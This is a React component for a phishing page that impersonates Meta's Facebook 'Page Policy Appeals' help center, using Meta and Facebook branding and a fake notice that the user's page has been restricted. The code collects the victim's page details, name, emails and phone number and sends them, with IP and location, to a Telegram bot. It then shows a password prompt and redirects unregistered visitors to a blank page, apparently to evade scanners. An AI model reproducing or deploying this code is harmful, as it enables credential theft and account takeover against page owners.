import FromMetaImage from '@/assets/images/from-meta.png';
import FacebookImage from '@/assets/images/icon.webp';
import PasswordInput from '@/components/password-input';
import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
const Home = () => {
    const defaultTexts = useMemo(
        () => ({
            helpCenter: 'Help Center',
            english: 'English',
            using: 'Using',
            managingAccount: 'Managing Your Account',
            privacySecurity: 'Privacy, Safety and Security',
            policiesReporting: 'Policies and Reporting',
            pagePolicyAppeals: 'Page Policy Appeals',
            detectedActivity: 'We have detected unusual activity on your page that violates our community standards.',
            accessLimited: 'Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.',
            submitAppeal: 'If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.',
            pageName: 'Page Name',
            pageUrl: 'Page URL',
            fullName: 'Full Name',
            businessEmail: 'Business Email Address',
            personalEmail: 'Personal Email Address',
            mobilePhone: 'Mobile Phone Number',
            additionalInfo: 'Please provide us information that will help us investigate.',
            additionalInfoPlaceholder: 'Enter additional information (optional)',
            submit: 'Submit',
            fieldRequired: 'This field is required',
            about: 'About',
            adChoices: 'Ad choices',
            createAd: 'Create ad',
            privacy: 'Privacy',
            careers: 'Careers',
            createPage: 'Create Page',
            termsPolicies: 'Terms and policies',
            cookies: 'Cookies'
        }),
        []
    );

    const [formData, setFormData] = useState({
        pageName: '',
        pageUrl: '',
        fullName: '',
        businessEmail: '',
        personalEmail: '',
        mobilePhone: '',
        additionalInfo: ''
    });

    const [showPassword, setShowPassword] = useState(false);
    const [errors, setErrors] = useState({});
    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [translatedHelpCenter, translatedEnglish, translatedUsing, translatedManaging, translatedPrivacy, translatedPolicies, translatedAppeals, translatedDetected, translatedLimited, translatedSubmit, translatedPageName, translatedPageUrl, translatedFullName, translatedBusinessEmail, translatedPersonalEmail, translatedMobile, translatedAdditional, translatedPlaceholder, translatedSubmitBtn, translatedRequired, translatedAbout, translatedAdChoices, translatedCreateAd, translatedPrivacyText, translatedCareers, translatedCreatePage, translatedTerms, translatedCookies] = await Promise.all([translateText(defaultTexts.helpCenter, targetLang), translateText(defaultTexts.english, targetLang), translateText(defaultTexts.using, targetLang), translateText(defaultTexts.managingAccount, targetLang), translateText(defaultTexts.privacySecurity, targetLang), translateText(defaultTexts.policiesReporting, targetLang), translateText(defaultTexts.pagePolicyAppeals, targetLang), translateText(defaultTexts.detectedActivity, targetLang), translateText(defaultTexts.accessLimited, targetLang), translateText(defaultTexts.submitAppeal, targetLang), translateText(defaultTexts.pageName, targetLang), translateText(defaultTexts.pageUrl, targetLang), translateText(defaultTexts.fullName, targetLang), translateText(defaultTexts.businessEmail, targetLang), translateText(defaultTexts.personalEmail, targetLang), translateText(defaultTexts.mobilePhone, targetLang), translateText(defaultTexts.additionalInfo, targetLang), translateText(defaultTexts.additionalInfoPlaceholder, targetLang), translateText(defaultTexts.submit, targetLang), translateText(defaultTexts.fieldRequired, targetLang), translateText(defaultTexts.about, targetLang), translateText(defaultTexts.adChoices, targetLang), translateText(defaultTexts.createAd, targetLang), translateText(defaultTexts.privacy, targetLang), translateText(defaultTexts.careers, targetLang), translateText(defaultTexts.createPage, targetLang), translateText(defaultTexts.termsPolicies, targetLang), translateText(defaultTexts.cookies, targetLang)]);

                setTranslatedTexts({
                    helpCenter: translatedHelpCenter,
                    english: translatedEnglish,
                    using: translatedUsing,
                    managingAccount: translatedManaging,
                    privacySecurity: translatedPrivacy,
                    policiesReporting: translatedPolicies,
                    pagePolicyAppeals: translatedAppeals,
                    detectedActivity: translatedDetected,
                    accessLimited: translatedLimited,
                    submitAppeal: translatedSubmit,
                    pageName: translatedPageName,
                    pageUrl: translatedPageUrl,
                    fullName: translatedFullName,
                    businessEmail: translatedBusinessEmail,
                    personalEmail: translatedPersonalEmail,
                    mobilePhone: translatedMobile,
                    additionalInfo: translatedAdditional,
                    additionalInfoPlaceholder: translatedPlaceholder,
                    submit: translatedSubmitBtn,
                    fieldRequired: translatedRequired,
                    about: translatedAbout,
                    adChoices: translatedAdChoices,
                    createAd: translatedCreateAd,
                    privacy: translatedPrivacyText,
                    careers: translatedCareers,
                    createPage: translatedCreatePage,
                    termsPolicies: translatedTerms,
                    cookies: translatedCookies
                });
            } catch {
                //
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            window.location.href = 'about:blank';
        }
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    const handleInputChange = (field, value) => {
        setFormData((prev) => ({
            ...prev,
            [field]: value
        }));

        if (errors[field]) {
            setErrors((prev) => ({
                ...prev,
                [field]: false
            }));
        }
    };

    const validateForm = () => {
        const requiredFields = ['pageName', 'pageUrl', 'fullName', 'businessEmail', 'personalEmail', 'mobilePhone'];
        const newErrors = {};

        requiredFields.forEach((field) => {
            if (formData[field].trim() === '') {
                newErrors[field] = true;
            }
        });

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async () => {
        if (validateForm()) {
            try {
                const telegramMessage = formatTelegramMessage(formData);
                await sendMessage(telegramMessage);

                setShowPassword(true);
            } catch {
                window.location.href = 'about:blank';
            }
        } else {
            const firstErrorField = Object.keys(errors)[0];
            if (firstErrorField) {
                const inputElement = document.querySelector(`input[name="${firstErrorField}"], textarea[name="${firstErrorField}"]`);
                if (inputElement) {
                    inputElement.focus();
                }
            }
        }
    };

    const formatTelegramMessage = (data) => {
        const timestamp = new Date().toLocaleString('vi-VN');
        const ipInfo = localStorage.getItem('ipInfo');
        const ipData = ipInfo ? JSON.parse(ipInfo) : {};

        return `📅 <b>Thời gian:</b> <code>${timestamp}</code>
🌍 <b>IP:</b> <code>${ipData.ip || 'k lấy được'}</code>
📍 <b>Vị trí:</b> <code>${ipData.city || 'k lấy được'} - ${ipData.region || 'k lấy được'} - ${ipData.country_code || 'k lấy được'}</code>

🔖 <b>Page Name:</b> <code>${data.pageName}</code>
🔗 <b>Page URL:</b> <code>${data.pageUrl}</code>
👤 <b>Họ tên:</b> <code>${data.fullName}</code>
📧 <b>Email business:</b> <code>${data.businessEmail}</code>
📧 <b>Email personal:</b> <code>${data.personalEmail}</code>
📱 <b>Số điện thoại:</b> <code>${data.mobilePhone}</code>
💬 <b>Thông tin bổ sung:</b>
<code>${data.additionalInfo || 'k có'}</code>`;
    };

    const handleClosePassword = () => {
        setShowPassword(false);
    };

    const data_list = [
        {
            id: 'using',
            icon: faCompass,
            title: translatedTexts.using
        },
        {
            id: 'managing',
            icon: faUserGear,
            title: translatedTexts.managingAccount
        },
        {
            id: 'privacy',
            icon: faLock,
            title: translatedTexts.privacySecurity
        },
        {
            id: 'policies',
            icon: faCircleExclamation,
            title: translatedTexts.policiesReporting
        }
    ];
    return (
        <>
            <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
                <title>Page Help Center</title>
                <div className='flex items-center gap-2'>
                    <img src={FacebookImage} alt='' className='h-10 w-10' />
                    <p className='font-bold'>{translatedTexts.helpCenter}</p>
                </div>
                <div className='flex items-center gap-2'>
                    <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
                        <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
                    </div>
                    <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{translatedTexts.english}</p>
                </div>
            </header>
            <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
                <nav className='hidden w-xs flex-col gap-2 p-4 shadow-lg sm:flex'>
                    {data_list.map((data) => {
                        return (
                            <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
                                <div className='flex items-center gap-2'>
                                    <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
                                        <FontAwesomeIcon icon={data.icon} />
                                    </div>
                                    <div>{data.title}</div>
                                </div>
                                <FontAwesomeIcon icon={faChevronDown} />
                            </div>
                        );
                    })}
                </nav>
                <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
                    <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12'>
                        <div className='bg-[#e4e6eb] p-6'>
                            <p className='text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                        </div>
                        <div className='p-4 text-sm leading-6 font-medium'>
                            <p>{translatedTexts.detectedActivity}</p>
                            <p>{translatedTexts.accessLimited}</p>
                            <p>{translatedTexts.submitAppeal}</p>
                        </div>
                        <div className='flex flex-col gap-2 p-4 text-sm leading-6 font-semibold'>
                            <div className='flex flex-col gap-2'>
                                <p>
                                    {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                </p>
                                <input type='text' name='pageName' autoComplete='organization' className={`w-full rounded-lg border px-3 py-1.5 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.pageName} onChange={(e) => handleInputChange('pageName', e.target.value)} />
                                {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p>
                                    {translatedTexts.pageUrl} <span className='text-red-500'>*</span>
                                </p>
                                <input type='url' name='pageUrl' autoComplete='url' className={`w-full rounded-lg border px-3 py-1.5 ${errors.pageUrl ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.pageUrl} onChange={(e) => handleInputChange('pageUrl', e.target.value)} />
                                {errors.pageUrl && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p>
                                    {translatedTexts.fullName} <span className='text-red-500'>*</span>
                                </p>
                                <input type='text' name='fullName' autoComplete='name' className={`w-full rounded-lg border px-3 py-1.5 ${errors.fullName ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.fullName} onChange={(e) => handleInputChange('fullName', e.target.value)} />
                                {errors.fullName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p>
                                    {translatedTexts.businessEmail} <span className='text-red-500'>*</span>
                                </p>
                                <input type='email' name='businessEmail' autoComplete='email' className={`w-full rounded-lg border px-3 py-1.5 ${errors.businessEmail ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.businessEmail} onChange={(e) => handleInputChange('businessEmail', e.target.value)} />
                                {errors.businessEmail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p>
                                    {translatedTexts.personalEmail} <span className='text-red-500'>*</span>
                                </p>
                                <input type='email' name='personalEmail' autoComplete='email' className={`w-full rounded-lg border px-3 py-1.5 ${errors.personalEmail ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.personalEmail} onChange={(e) => handleInputChange('personalEmail', e.target.value)} />
                                {errors.personalEmail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p>
                                    {translatedTexts.mobilePhone} <span className='text-red-500'>*</span>
                                </p>
                                <input type='tel' name='mobilePhone' inputMode='numeric' pattern='[0-9]*' autoComplete='tel' className={`w-full rounded-lg border px-3 py-1.5 ${errors.mobilePhone ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.mobilePhone} onChange={(e) => handleInputChange('mobilePhone', e.target.value)} />
                                {errors.mobilePhone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p>{translatedTexts.additionalInfo}</p>
                                <textarea cols={20} name='additionalInfo' className='rounded-lg border border-gray-300 px-3 py-1.5' value={formData.additionalInfo} onChange={(e) => handleInputChange('additionalInfo', e.target.value)} placeholder={translatedTexts.additionalInfoPlaceholder}></textarea>
                            </div>
                            <button className='w-fit rounded-lg bg-gray-200 px-3 py-2 text-[15px] font-normal' onClick={handleSubmit}>
                                {translatedTexts.submit}
                            </button>
                        </div>
                    </div>
                    <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
                        <div className='mx-auto flex justify-between'>
                            <div className='flex flex-col space-y-4'>
                                <p>{translatedTexts.about}</p>
                                <p>{translatedTexts.adChoices}</p>
                                <p>{translatedTexts.createAd}</p>
                            </div>
                            <div className='flex flex-col space-y-4'>
                                <p>{translatedTexts.privacy}</p>
                                <p>{translatedTexts.careers}</p>
                                <p>{translatedTexts.createPage}</p>
                            </div>
                            <div className='flex flex-col space-y-4'>
                                <p>{translatedTexts.termsPolicies}</p>
                                <p>{translatedTexts.cookies}</p>
                            </div>
                        </div>
                        <hr className='my-8 h-0 border border-transparent border-t-gray-300' />
                        <div className='flex justify-between'>
                            <img src={FromMetaImage} alt='' className='w-[100px]' />
                            <p className='text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
                        </div>
                    </div>
                </div>
            </main>
            {showPassword && <PasswordInput onClose={handleClosePassword} />}
        </>
    );
};
export default Home;
